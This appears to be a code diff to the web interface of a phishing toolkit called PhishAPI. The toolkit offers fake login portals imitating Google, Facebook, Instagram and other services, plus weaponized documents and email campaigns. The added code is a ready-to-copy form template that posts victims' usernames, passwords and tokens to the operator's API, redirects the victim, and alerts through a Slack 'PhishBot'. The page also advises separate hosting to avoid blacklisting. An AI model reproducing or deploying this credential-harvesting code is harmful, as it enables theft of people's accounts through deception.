@@ -87,6 +87,12 @@ $conn2->close();
 <HEAD>
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
 <link rel="stylesheet" href="main.css">
+<style>
+textarea {
+  width: 600px;
+  height: 350px;
+}
+</style>
 </HEAD>
 <BODY>
 <CENTER>
@@ -102,7 +108,56 @@ $conn2->close();
 <TR><TD style="vertical-align:bottom"><a href="templates/templatecreation.php?template=instagram"><img src="templates/instagramportal.png" width="200"></a><br><br><b>Instagram</b></TD><TD style="vertical-align:bottom"><a href="templates/templatecreation.php?template=wordpress"><img src="templates/wordpressportal.png" width="200"></a><br><br><b>WordPress</b></TD><TD style="vertical-align:bottom"><a href="templates/templatecreation.php?template=google"><img src="templates/googleportal.png" width="200"></a><br><br><b>Google</b></TD></TR>
 <TR><TD style="vertical-align:bottom"><a href="templates/templatecreation.php?template=facebook"><img src="templates/facebookportal.png" width="200"></a><br><br><b>Facebook</b></TD><TD style="vertical-align:bottom"><a href="templates/templatecreation.php?template=linkedin"><img src="templates/linkedinportal.png" width="200"></a><br><br><b>LinkedIn</b></TD><TD style="vertical-align:bottom"><a href="templates/templatecreation.php?template=twitter"><img src="templates/twitterportal.png" width="200"></a><br><br><b>Twitter</b></TD></TR>
 </TABLE>
-<BR><FONT COLOR="#FFFFFF">Choose a default template, download the HTML, and customize however you'd like.  <br><br>For best results, host these landing pages on their own server to avoid having the API blacklisted for a certain campaign.  <br><br>Use SSL for both so there is no mixed-content.  These pages already contain the fields necessary for the API!</FONT>
+<BR><FONT COLOR="#FFFFFF" SIZE="3">Choose a default template, download the HTML, and customize however you'd like.  <br><br>For best results, host these landing pages on their own server to avoid having the API blacklisted for a certain campaign.  <br><br>Use SSL for both so there is no mixed-content.  These pages already contain the fields necessary for the API!</FONT>
+<BR><BR>
+<FONT COLOR="#FFFFFF"><H2>OR</H2><br>Use Your Own HTML and Embed the API Tags</FONT><BR><BR>
+<textarea style="text-align:left" class="js-emaillink">
+<!-- LOCATION OF YOUR API TO POST TO -->
+<FORM METHOD="POST" ACTION="<?php echo $APIDomain; ?>">
+
+<!-- MAKE SURE INPUT FIELDS ARE NAMED AS FOLLOWS -->
+<INPUT NAME="username">
+
+<INPUT NAME="password">
+
+<!-- NOT REQUIRED -->
+<INPUT NAME="token">
+
+<!-- UNIQUE PROJECT NAME FOR SORTING OF DATA ON BACKEND -->
+<INPUT NAME="project" VALUE="My_Project_Here" TYPE="hidden">
+
+<!-- LOCATION THE USER WILL BE REDIRECTED TO AFTER SUBMITTING CREDENTIALS -->
+<INPUT NAME="redirect" VALUE="https://site_to_redirect_to" TYPE="hidden">
+
+<!-- OPTIONAL SLACKBOT MODIFICATIONS FOR ALERTING -->
+<INPUT NAME="slackbotname" VALUE="PhishBot" TYPE="hidden">
+
+<INPUT NAME="slackemoji" VALUE=":fishing_pole_and_fish:" TYPE="hidden"></textarea>
+<p><button class="js-emailcopybtn btn" style="width:25%">Copy to Clipboard</button></p>
+
+<script>
+var copyEmailBtn = document.querySelector('.js-emailcopybtn');  
+copyEmailBtn.addEventListener('click', function(event) {  
+  // Select the email link anchor text  
+  var emailLink = document.querySelector('.js-emaillink');  
+  var range = document.createRange();  
+  range.selectNode(emailLink);  
+  window.getSelection().addRange(range);  
+
+  try {  
+    // Now that we've selected the anchor text, execute the copy command  
+    var successful = document.execCommand('copy');  
+    var msg = successful ? 'successful' : 'unsuccessful';  
+    console.log('Copy email command was ' + msg);  
+  } catch(err) {  
+    console.log('Oops, unable to copy');  
+  }  
+
+  // Remove the selections - NOTE: Should use
+  // removeRange(range) when it is supported  
+  window.getSelection().removeAllRanges();  
+});
+</script>
 </CENTER>
 </BODY>
 </HTML>
@@ -114,12 +169,13 @@ if($redirect == false){ ?>
 <HTML>
 <HEAD>
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
-<link rel="stylesheet" href="main.css">
+<link rel="stylesheet" type="text/css" href="main.css">
 </HEAD>
 <BODY>
 <BR><CENTER><FONT COLOR="#FFFFFF"><H1>Welcome to PhishAPI</H1>
 <b>Choose an Option Below to Get Started!</b>
-<BR><BR><BR><TABLE>
+<BR><BR><BR>
+<TABLE>
 <TR><TH>Fake Portal</TH><TH>Weaponized Documents</TH><TH>Email Campaigns</TH></TR>
 <TR><TD><a href="index.php?fakesite=1"><i class="fa fa-user fa-5X" aria-hidden="true" style="color: black;  font-size: 150px;"></i></a></TD><TD><a href="/phishingdocs/"><i class="fa fa-file-text fa-5X" aria-hidden="true"  style="color: black; font-size: 150px;"></a></TD><TD><a href="campaigns/"><i class="fa fa-envelope fa-5X" aria-hidden="true" style="color: black; font-size: 150px;"></i></a></TD></TR>
 </TABLE>
